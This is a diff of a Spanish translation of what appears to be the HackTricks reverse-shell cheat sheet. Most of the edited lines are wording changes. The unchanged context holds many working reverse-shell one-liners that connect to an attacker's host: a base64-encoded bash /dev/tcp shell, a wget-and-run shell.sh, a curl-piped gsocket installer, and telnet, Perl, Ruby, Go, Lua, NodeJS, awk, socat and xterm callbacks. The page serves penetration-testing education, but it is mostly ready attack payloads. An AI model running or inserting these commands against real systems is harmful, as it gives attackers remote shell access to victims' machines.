@@ -16,7 +16,7 @@ Otras formas de apoyar a HackTricks:
 
 **Grupo de Seguridad Try Hard**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -54,10 +54,10 @@ echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMSc
 ```
 #### Explicación del Shell
 
-1. **`bash -i`**: Esta parte del comando inicia un shell interactivo (`-i`) de Bash.
+1. **`bash -i`**: Esta parte del comando inicia un shell Bash interactivo (`-i`).
 2. **`>&`**: Esta parte del comando es una notación abreviada para **redirigir tanto la salida estándar** (`stdout`) como el **error estándar** (`stderr`) al **mismo destino**.
-3. **`/dev/tcp/<DIRECCIÓN-IP-DEL-ATAQUE>/<PUERTO>`**: Este es un archivo especial que **representa una conexión TCP a la dirección IP y puerto especificados**.
-* Al **redirigir las corrientes de salida y error a este archivo**, el comando envía efectivamente la salida de la sesión de shell interactiva a la máquina del atacante.
+3. **`/dev/tcp/<IP-DEL-ATAQUE>/<PUERTO>`**: Este es un archivo especial que **representa una conexión TCP a la dirección IP y puerto especificados**.
+* Al **redirigir los flujos de salida y error a este archivo**, el comando envía efectivamente la salida de la sesión de shell interactiva a la máquina del atacante.
 4. **`0>&1`**: Esta parte del comando **redirige la entrada estándar (`stdin`) al mismo destino que la salida estándar (`stdout`)**.
 
 ### Crear en archivo y ejecutar
@@ -67,7 +67,7 @@ wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.s
 ```
 ## Shell Inverso
 
-Cuando se trata de una vulnerabilidad de **Ejecución de Código Remoto (RCE)** en una aplicación web basada en Linux, lograr un shell inverso puede ser obstaculizado por defensas de red como reglas de iptables o mecanismos de filtrado de paquetes intrincados. En entornos tan restringidos, un enfoque alternativo implica establecer un shell PTY (Pseudo Terminal) para interactuar con el sistema comprometido de manera más efectiva.
+Cuando se trata de una vulnerabilidad de **Ejecución de Código Remoto (RCE)** en una aplicación web basada en Linux, lograr un shell inverso puede ser obstaculizado por defensas de red como reglas iptables o mecanismos de filtrado de paquetes intrincados. En entornos tan restringidos, un enfoque alternativo implica establecer un shell PTY (Pseudo Terminal) para interactuar con el sistema comprometido de manera más efectiva.
 
 Una herramienta recomendada para este propósito es [toboggan](https://github.com/n3rada/toboggan.git), que simplifica la interacción con el entorno objetivo.
 
@@ -109,7 +109,7 @@ Solo necesitas modificar:
 - El prefijo y sufijo de tu carga útil (si es necesario)
 - La forma en que se envía la carga útil (¿encabezados? ¿datos? ¿información adicional?)
 
-Luego, simplemente puedes **enviar comandos** o incluso **usar el comando `upgrade`** para obtener un PTY completo (ten en cuenta que las tuberías se leen y escriben con un retraso aproximado de 1.3 segundos).
+Luego, simplemente puedes **enviar comandos** o incluso **usar el comando `upgrade`** para obtener un PTY completo (ten en cuenta que los pipes se leen y escriben con un retraso aproximado de 1.3 segundos).
 
 ## Netcat
 ```bash
@@ -127,7 +127,7 @@ bash -c "$(curl -fsSL gsocket.io/x)"
 ```
 ## Telnet
 
-Telnet es un protocolo de red que permite la comunicación bidireccional a través de una terminal virtual. Es comúnmente utilizado para acceder y administrar dispositivos de red de forma remota.
+Telnet es un protocolo de red que permite la comunicación bidireccional a través de terminales virtuales. Es comúnmente utilizado para acceder y administrar dispositivos de red de forma remota.
 ```bash
 telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
@@ -140,7 +140,7 @@ rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-I
 ```bash
 while true; do nc -l <port>; done
 ```
-Para enviar el comando, escríbalo, presione enter y luego presione CTRL+D (para detener STDIN)
+Para enviar el comando, escríbalo, presione Enter y luego presione CTRL+D (para detener STDIN)
 
 **Victim**
 ```bash
@@ -161,7 +161,7 @@ perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PO
 ```
 ## Ruby
 
-Ruby es un lenguaje de programación dinámico y de código abierto con un enfoque en la simplicidad y la productividad. Es ampliamente utilizado para el desarrollo web y es conocido por su elegancia y facilidad de lectura.
+Ruby es un lenguaje de programación dinámico y de código abierto conocido por su simplicidad y productividad. Es ampliamente utilizado en el desarrollo web y en la creación de scripts.
 ```bash
 ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
@@ -194,6 +194,8 @@ attacker> ncat -v 10.0.0.22 4444 --ssl
 echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
 ```
 ## Lua
+
+Lua es un lenguaje de programación ligero y de alto nivel diseñado para ser integrado en aplicaciones. Es ampliamente utilizado en la creación de scripts y en el desarrollo de videojuegos. Lua es conocido por ser rápido, eficiente y fácil de aprender.
 ```bash
 #Linux
 lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
@@ -202,7 +204,7 @@ lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket")
 ```
 ## NodeJS
 
-NodeJS es una plataforma de tiempo de ejecución de JavaScript de código abierto que se utiliza para ejecutar código del lado del servidor. Permite a los hackers ejecutar scripts maliciosos en un servidor comprometido.
+NodeJS es una plataforma de tiempo de ejecución de JavaScript de código abierto que se utiliza para ejecutar código JavaScript del lado del servidor. NodeJS es ampliamente utilizado en el desarrollo web para crear aplicaciones web escalables y de alto rendimiento. Una de las características clave de NodeJS es su capacidad para manejar múltiples conexiones de forma asíncrona, lo que lo hace ideal para aplicaciones en tiempo real como chats en línea y juegos en línea.
 ```javascript
 (function(){
 var net = require("net"),
@@ -277,7 +279,7 @@ victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
 ```
 ## Awk
 
-Awk es un lenguaje de programación versátil y poderoso utilizado comúnmente para el procesamiento y análisis de archivos de texto en sistemas Unix y Linux. Permite a los hackers automatizar tareas, extraer y manipular datos, y generar informes personalizados.
+Awk es un lenguaje de programación versátil y poderoso utilizado comúnmente para el procesamiento de texto y la extracción de datos. Puede ser utilizado en la línea de comandos de Linux para realizar diversas tareas, como buscar y reemplazar texto, filtrar y formatear datos, y mucho más. Awk es especialmente útil para manipular archivos de texto de una manera eficiente y efectiva.
 ```bash
 awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
 ```
@@ -287,7 +289,7 @@ awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s;
 ```bash
 while true; do nc -l 79; done
 ```
-Para enviar el comando, escríbelo, presiona Enter y luego presiona CTRL+D (para detener STDIN)
+Para enviar el comando, escríbalo, presione enter y luego presione CTRL+D (para detener STDIN)
 
 **Victim**
 ```bash
@@ -326,7 +328,7 @@ Esto intentará conectarse a su sistema en el puerto 6001:
 ```bash
 xterm -display 10.0.0.1:1
 ```
-Para capturar la shell inversa puedes usar (que estará a la escucha en el puerto 6001):
+Para capturar la shell inversa puedes usar (que estará escuchando en el puerto 6001):
 ```bash
 # Authorize host
 xhost +targetip
@@ -351,7 +353,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 
 **Grupo de Seguridad Try Hard**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -363,7 +365,7 @@ Otras formas de apoyar a HackTricks:
 
 * Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
 * Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
+* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
 * **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
